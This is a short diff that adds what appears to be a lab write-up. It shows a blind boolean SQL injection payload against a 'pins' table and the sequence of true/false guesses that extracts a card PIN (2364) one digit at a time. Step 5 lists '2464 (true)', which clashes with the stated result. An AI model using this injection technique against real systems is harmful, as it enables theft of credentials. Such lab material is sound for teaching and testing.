@@ -1,0 +1,32 @@
+The following is the SQL injection I used:
+
+101 AND ((SELECT count(*)
+		FROM pins
+		WHERE cc_number = 1111222233334444 AND pin >= <guessed pin value>) >0)
+		
+The value of the PIN is 2364.
+
+The value of the PIN is determined by using a guessed PIN value in the SQL injection. 
+If the guessed PIN cirteria is true, the SQL will return true. 
+
+1. Determine the size of PIN digits by using the following values
+	10 (true)
+	100 (true)
+	1000 (true)
+	10000 (false)
+	Thus the PIN is 4 digits
+2. Determine the first (left most) digit of the PIN by using the following values
+	1000 (true)
+	2000 (true)
+	3000 (false)
+3. Determine the second digit of the PIN by using the following values
+	2500 (false)
+	2400 (false)
+	2300 (true)
+4. Determine the third digit of the PIN by using the following values
+	2350 (true)
+	2360 (true)
+	2370 (false)
+5. Determine the last digit of the PIN by using the following values
+	2365 (false)
+	2464 (true)
